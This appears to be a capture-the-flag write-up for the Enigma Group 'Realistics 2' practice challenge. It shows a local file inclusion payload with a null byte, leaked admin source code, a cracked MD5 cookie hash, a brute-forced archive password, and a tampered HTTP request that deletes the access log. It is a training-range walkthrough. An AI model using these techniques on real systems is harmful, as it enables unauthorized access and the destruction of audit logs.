@@ -1,0 +1,128 @@
+Task on enigmagroup: http://challenges.enigmagroup.org/realistics/2/
+Video Solution: https://youtu.be/YBWFe36rvAk
+
+http://challenges.enigmagroup.org/realistics/2/index.php?page=news%27
+ Warning: main(pages/news'.txt): failed to open stream: No such file or directory in /home/enigmagroup/public_html/realistics/2//index.php on line 91
+
+Site is vulnerable to LFI.
+
+Let's find admin panel. - http://challenges.enigmagroup.org/realistics/2/admin/
+look in robots.txt and we see the admin directory.
+Now with LFI we can view source code of admin panel - http://challenges.enigmagroup.org/realistics/2/index.php?page=../admin/index.php%00 needs a null byte attack
+This shows the source code of admin/index.php
+
+<?php
+/**
+ * @version $id: xedni.php, v.1.0, 2007/11/05 $
+ * @package Realistic:2
+ */
+
+// require the mission include
+require_once('mission_data/mission.inc.php');
+
+/** Are they logged in? **/
+if ($_COOKIE["admin"] == "Brain-Tek Administrator:4fe56cc1316aa2c0291bba957df0513e")
+{
+
+// 4fe56cc1316aa2c0291bba957df0513e after brute this hash you find that it's "crime"
+// And we can login to admin panel as Brain-Tek Administrator:crime
+    $action = htmlentities($_GET['action']);
+    if ($action == "add")
+    {
+        include("add.php");
+    }
+    elseif ($action == "del")
+    {
+        include("del.php");
+    }
+    elseif ($action == "log")
+    {
+        include("log.php");
+    }
+    else
+    {
+        echo '
+        <br><br>
+        <table align="center">
+        <tr><td>Add News</td><td><a href="?action=add">[ADD]</a></td></tr>
+        <tr><td>Delete News</td><td><a href="?action=del">[DEL]</a></td></tr>
+        <tr><td>Logout</td><td><a href="?action=log">[LOG]</a></td></tr>
+        </table>
+        <br><br>';
+    }
+}
+/** Are they logging in? **/
+elseif (isset($_POST["submit"]))
+{
+    $uname = htmlentities($_POST["uname"]);
+    $pword = md5(md5($_POST["pword"]));
+    if ($user == $uname && $pass == $pword)
+    {
+        setcookie("admin", $uname.":".$pword, time()+36000);
+        echo '
+        <br /><br />
+        <table align="center">
+        <tr><td>Add News</td><td><a href="add.php">[ADD]</a></td></tr>
+        <tr><td>Delete News</td><td><a href="del.php">[DEL]</a></td></tr>
+        <tr><td>Logout</td><td><a href="log.php">[LOG]</a></td></tr>
+        </table>
+        <br /><br />';
+    }
+    else
+    {
+        die('Login Failure!');
+    }
+}
+
+/** No? Let them log in **/
+else
+{
+    echo '<table align="center" height="100%">';
+    echo '<tr><td valign="middle">';
+    echo '<form action="" method="POST">';
+    echo '<b>Username</b>: <input type="text" name="uname" /><br />';
+    echo '<b>Password</b>: &nbsp;<input type="password" name="pword" /><br />';
+    echo '<input type="submit" name="submit" value="Login" />';
+    echo '</td></tr>';
+    echo '</table>';
+}
+?>
+
+Add news with ' in title to catch error.
+
+MYSQL ERROR
+An error occurred when trying to submit your news entry into tbl_news1 in the database hst_braintek.
+
+After the editors have reviewed your news in the database, it will be transferred to the news directory.
+Now we know that news directory present in admin panel.
+Download archive from news directory. After brute with cRark plus wordlist you find the password: "brain".
+
+P.S.
+I forgot to tell you, your purchase code is 1JH-8DQ-B6X-P1D.
+Don't let anybody else get your code. Once a purchase has been made with it, your affiliation with us is terminated. No refunds.
+
+We get to purchase code.
+Don't forget to clear the logs! So, we must clear logs. http://challenges.enigmagroup.org/realistics/2/admin/logs/
+All logs in this file accesslog.txt
+Open BurpSuite. After intercepting post request.
+
+POST /realistics/2/admin/?action=del HTTP/1.1
+Host: challenges.enigmagroup.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://challenges.enigmagroup.org/realistics/2/admin/?action=del
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Cookie: admin=Brain-Tek+Administrator%3A4fe56cc1316aa2c0291bba957df0513e; __utma=144401761.777599216.1519908495.1520112366.1522057488.4; __utmz=144401761.1519908495.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.2.777599216.1519908495; PHPSESSID=c45q2jve61os6gnke7h9p8b1i4; __utmb=144401761.4.10.1522057488; __utmc=144401761
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+name=accesslog.txt&dir=news&submit=Delete
+
+
+change dir to logs. Logs have been cleared! Nice.
+Now send purchase code to challenges.enigmagroup.org/realistics/2/send.php
+Mission completed!
+
